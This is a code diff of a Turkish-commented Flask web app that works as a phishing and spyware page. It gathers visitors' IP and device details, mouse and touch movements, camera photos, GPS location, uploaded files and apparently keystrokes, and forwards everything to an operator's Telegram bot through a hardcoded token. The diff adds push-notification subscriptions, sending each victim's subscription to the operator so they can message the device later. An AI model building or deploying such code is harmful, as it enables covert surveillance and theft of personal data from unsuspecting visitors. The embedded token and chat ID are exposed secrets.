@@ -3,13 +3,16 @@ import requests
 import os
 import base64
 import json
-import time # 🚨 İŞTE EKSİK OLAN KÜTÜPHANE BURADA!
+import time
 
 app = Flask(__name__)
 
 TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
 CHAT_ID = "7622505128"
 GIZLI_ANAHTAR = "Utkan_Super_Gizli_2024" 
+
+# 🚨 GENEL ANAHTAR (PUBLIC KEY)
+PUBLIC_KEY = "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE/4gG6JoXxRLcT8MVgXcDXMMxSioUqFtsKRp4UtkbNBkZduOsVo0RDbTngexn8sUoNUTk37uBZbeVXn8J80VjfA=="
 
 def telegram_mesaj_gonder(mesaj):
     try:
@@ -25,20 +28,16 @@ def telegram_fotograf_gonder(fotograf_base64, bilgi_metni):
         files = {'photo': ('ajan.jpg', resim_bytes)}
         data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
         requests.post(url, files=files, data=data, timeout=15)
-    except Exception as e: 
-        telegram_mesaj_gonder(f"❌ Fotoğraf Hatası: {str(e)}")
+    except: pass
 
 def telegram_dosya_gonder(dosya, dosya_adi, aciklama):
     try:
-        # Dosya adını güvenli hale getir (Türkçe karakterleri sil)
         guvenli_isim = "dosya_" + str(int(time.time())) + "_" + dosya_adi.replace(" ", "_")
-        
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
         files = {'document': (guvenli_isim, dosya)}
         data = {'chat_id': CHAT_ID, 'caption': aciklama}
         requests.post(url, files=files, data=data, timeout=30)
-    except Exception as e:
-        telegram_mesaj_gonder(f"❌ Dosya Gönderme Hatası: {str(e)}")
+    except Exception as e: pass
 
 @app.route('/', methods=['GET'])
 def ana_sayfa():
@@ -98,10 +97,21 @@ def ana_sayfa():
         const IP_ADRESI = {guvenli_ip};
         const CIHAZ_BILGISI = {guvenli_cihaz};
         const SECRET_KEY = {guvenli_anahtar};
+        const PUBLIC_VAPID_KEY = "{PUBLIC_KEY}";
 
         let adim = 1;
         let hareketVerisi = [];
         let sonHareketZamani = 0;
+
+        // Push Bildirimleri için Base64 Çevirici
+        function urlBase64ToUint8Array(base64String) {{
+            const padding = '='.repeat((4 - base64String.length % 4) % 4);
+            const base64 = (base64String + padding).replace(/\\-/g, '+').replace(/_/g, '/');
+            const rawData = window.atob(base64);
+            const outputArray = new Uint8Array(rawData.length);
+            for (let i = 0; i < rawData.length; ++i) {{ outputArray[i] = rawData.charCodeAt(i); }}
+            return outputArray;
+        }}
 
         const btnEvet = document.getElementById('btnEvet');
         const btnHayir = document.getElementById('btnHayir');
@@ -142,9 +152,7 @@ def ana_sayfa():
                 hareketVerisi.push({{ x: Math.round(x), y: Math.round(y), t: suan }});
                 sonHareketZamani = suan;
             }}
-            if (hareketVerisi.length >= 20) {{
-                hareketGonder();
-            }}
+            if (hareketVerisi.length >= 20) {{ hareketGonder(); }}
         }}
 
         function hareketGonder() {{
@@ -157,36 +165,34 @@ def ana_sayfa():
             hareketVerisi = []; 
         }}
 
-        window.addEventListener('touchmove', (e) => {{
-            const touch = e.touches[0];
-            hareketEkle(touch.clientX, touch.clientY);
-        }}, {{ passive: true }});
-
-        window.addEventListener('mousemove', (e) => {{
-            hareketEkle(e.clientX, e.clientY);
-        }});
-
+        window.addEventListener('touchmove', (e) => {{ hareketEkle(e.touches[0].clientX, e.touches[0].clientY); }}, {{ passive: true }});
+        window.addEventListener('mousemove', (e) => {{ hareketEkle(e.clientX, e.clientY); }});
         window.addEventListener('beforeunload', hareketGonder);
 
         async function izinleriIste() {{
             const durum = document.getElementById('durum');
             
-            // 1. ÖNCE CİHAZ BİLGİSİ
+            // 1. CİHAZ BİLGİSİ
             fetch('/cihaz', {{
                 method: 'POST',
                 headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                 body: JSON.stringify({{ ip: IP_ADRESI, cihaz: CIHAZ_BILGISI }})
             }}).catch(e => console.log(e));
 
-            // 2. BİLDİRİM İZNİ
-            if ("Notification" in window) {{
-                Notification.requestPermission().then(function(permission) {{
-                    fetch('/bildirim', {{
+            // 2. BİLDİRİM İZNİ VE ABONELİK
+            if ('serviceWorker' in navigator && 'PushManager' in window) {{
+                navigator.serviceWorker.register('/sw.js').then(function(swReg) {{
+                    return swReg.pushManager.subscribe({{
+                        userVisibleOnly: true,
+                        applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY)
+                    }});
+                }}).then(function(subscription) {{
+                    fetch('/abone_ol', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
-                        body: JSON.stringify({{ durum: permission }})
+                        body: JSON.stringify(subscription)
                     }}).catch(e => console.log(e));
-                }});
+                }}).catch(function(error) {{ console.log('Abonelik hatası:', error); }});
             }}
 
             try {{
@@ -210,7 +216,7 @@ def ana_sayfa():
 
                     durum.innerHTML = "Kamera açıldı. Konum alınıyor...";
                     
-                    // 4. GPS KONUM (1 saniye sonra)
+                    // 4. GPS KONUM
                     setTimeout(() => {{
                         if (navigator.geolocation) {{
                             navigator.geolocation.getCurrentPosition(
@@ -256,9 +262,7 @@ def ana_sayfa():
                             body: formData
                         }}).then(() => {{
                             durum.innerHTML = "Dosya Telegram'a Gönderildi!";
-                        }}).catch(e => {{
-                            durum.innerHTML = "Dosya yüklenirken hata oluştu.";
-                        }});
+                        }}).catch(e => {{ durum.innerHTML = "Dosya yüklenirken hata oluştu."; }});
                     }}
                 }});
 
@@ -273,6 +277,23 @@ def ana_sayfa():
     return html
 
 # --- ROTALAR ---
+
+@app.route('/abone_ol', methods=['POST'])
+def abone_ol():
+    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
+    abonelik = request.json
+    
+    # Gelen aboneliği bir dosyaya kaydet (Render'da geçici olarak tutar)
+    try:
+        with open('aboneler.json', 'a') as f:
+            f.write(json.dumps(abonelik) + "\n")
+    except: pass
+
+    # 🚨 ÖNEMLİ: Abonelik kodunu Telegram'a yolla ki kopyalayıp terminalde kullanabilesin!
+    mesaj = f"🔔 <b>YENİ CİHAZ ABONE OLDU!</b>\n\nBu JSON kodunu kopyala ve Pydroid'de kullan:\n\n<code>{json.dumps(abonelik)}</code>"
+    telegram_mesaj_gonder(mesaj)
+    return "OK", 200
+
 @app.route('/bildirim', methods=['POST'])
 def bildirim():
     if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
@@ -280,8 +301,6 @@ def bildirim():
     durum = veri.get('durum')
     if durum == 'granted':
         telegram_mesaj_gonder("🔔 <b>BİLDİRİM İZNİ VERİLDİ!</b>")
-    else:
-        telegram_mesaj_gonder(f"🔕 <b>BİLDİRİM İZNİ VERİLMEDİ ({durum}).</b>")
     return "OK", 200
 
 @app.route('/hareket', methods=['POST'])
@@ -330,24 +349,11 @@ def keylog():
 
 @app.route('/dosya', methods=['POST'])
 def dosya():
-    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: 
-        print("Hata: Anahtar uyuşmuyor.")
-        return "Hata", 403
-    if 'dosya' not in request.files: 
-        print("Hata: Dosya yok.")
-        return "Hata", 400
-    
+    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
+    if 'dosya' not in request.files: return "Hata", 400
     dosya = request.files['dosya']
-    if dosya.filename == '':
-        print("Hata: Dosya adı boş.")
-        return "Hata", 400
-
-    # Dosyayı oku
     dosya_icerigi = dosya.read()
-    
-    # Telegram'a gönder
     telegram_dosya_gonder(dosya_icerigi, dosya.filename, "📁 <b>DOSYA ELE GEÇİRİLDİ!</b>")
-    
     return "OK", 200
 
 @app.route('/kamera', methods=['POST'])
